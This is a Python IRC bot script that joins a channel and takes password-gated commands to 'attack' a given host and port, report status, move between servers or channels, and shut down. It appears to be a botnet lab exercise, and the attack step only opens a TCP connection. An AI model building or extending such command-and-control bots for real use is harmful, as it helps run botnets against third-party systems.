import sys
import socket
import random
import time

# argv check
try:
    hostname= sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    sphrase = sys.argv[4]
except Exception as err:
    print("invalid arguments: python3 bot.py <hostname> <port> <channel> <secret-phrase>")
    sys.exit()


# use to establish connection with a irc
def connect(irc, hostname, port):
    irc.connect((hostname, port))
    global botname
    while True:
        botname = "bot"+str(random.randint(0,999999))
        msg = "NICK " + botname + "\r\n"
        irc.send(msg.encode())
        msg = "USER "+botname+" * * : bot " + botname +"\r\n"
        irc.send(msg.encode())
        indata = irc.recv(1024)
        inmsg = indata.decode("utf-8").split("\r\n")
        state_code=inmsg[0].split()[1]
        # wait 5s before retrying to coneect
        if state_code != "001":
            time.sleep(5)
        else:
            break
    return

# join channel
def joinChannel(irc,name):
    msg = "JOIN #" +name+" \r\n"
    irc.send(msg.encode())
    indata = irc.recv(1024)
    inmsg = indata.decode("utf-8").split("\r\n")
    if inmsg[0].split()[1] == "JOIN":
        print("connected")
        return True
    return False
#handles Ping msg
def ping(pingmsg):
    msg = "PONG "+pingmsg+"\r\n"
    irc.send(msg.encode())
    print ("PONG!")
    return

#handles shutdown
def shutdown(masterName):
    msg = "PRIVMSG "+masterName+" :Shutting Down\r\n"
    irc.send(msg.encode())
    irc.close()
    sys.exit()
    return
#use to handle status command
def status(masterName):
    msg = "PRIVMSG "+masterName+" :Here\r\n"
    irc.send(msg.encode())
    return
#use to attack
def attack(masterName, hostname, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.connect((hostname,port))
        attack = botname+" "+str(atkCounter)+"\r\n"
        s.send(attack.encode())
        msg = "PRIVMSG "+masterName+" :attack success\r\n"
        irc.send(msg.encode())
    except Exception as err:
        msg = "PRIVMSG "+masterName+" :attack fail, "+str(err)+"\r\n"
        irc.send(msg.encode())
    return
#use to move
def move(masterName,hostname1,port1,channel1):
    global botname
    global hostname
    global port
    global channel
    global irc
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        # if the different server connect
        if hostname != hostname1 and port != port1:
            s.connect((hostname1,port1))
            msg = "NICK " + botname + "\r\n"
            s.send(msg.encode())
            msg = "USER "+botname+" * * : bot " + botname +"\r\n"
            s.send(msg.encode())
            indata = s.recv(1024)
            inmsg = indata.decode("utf-8").split("\r\n")
            state_code=inmsg[0].split()[1]
            if state_code == "001":
                if joinChannel(s,channel1) == False:
                    raise Exception("Cannot join channel")
            else:
                raise Exception("Cannot connect to server")
            # send success message
            msg = "PRIVMSG "+masterName+" :move success\r\n"
            irc.send(msg.encode())
            # set new var
            irc = s
            hostname = hostname1
            port = port1

        # if same server PART channel
        else:
            if joinChannel(irc,channel1) == False:
                raise Exception("Cannot join channel")
            msg = "PART #" +channel+" \r\n"
            irc.send(msg.encode())
            indata = irc.recv(1024)
            inmsg = indata.decode("utf-8").split("\r\n")
            # send success message
            msg = "PRIVMSG "+masterName+" :move success\r\n"
            irc.send(msg.encode())
        # change to new channel
        channel = channel1

    except Exception as err:
        msg = "PRIVMSG "+masterName+" :move fail, "+str(err)+"\r\n"
        irc.send(msg.encode())

    return
# use the listen to chat
def listen():
    global atkCounter

    while True:
        indata = irc.recv(1024)
        inmsg = indata.decode("utf-8").split()
        print(inmsg)
        if 'PING' in inmsg[0]:
            ping(inmsg[1])
            continue
        try:
            masterName = inmsg[0].split("!")[0].replace(":","")

            inPhrase = inmsg[3]
            inCmd = inmsg[4]

            if ":"+sphrase == inPhrase:
                print ("serving master!")
                if inCmd == 'attack':
                    attack(masterName,inmsg[5],int(inmsg[6]))
                    atkCounter += 1
                elif inCmd == 'status':
                    status(masterName)
                elif inCmd == 'move':
                    move(masterName,inmsg[5],int(inmsg[6]),inmsg[7])

                elif inCmd == 'shutdown':
                    shutdown(masterName)

        except Exception as err:
            print(err)
            print("not a valid cmd")
            continue

    return

# main=========================================================================

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
botname = ""
atkCounter = 0
while True:
    connect(irc,hostname,port)
    joinChannel(irc,channel)
    listen()
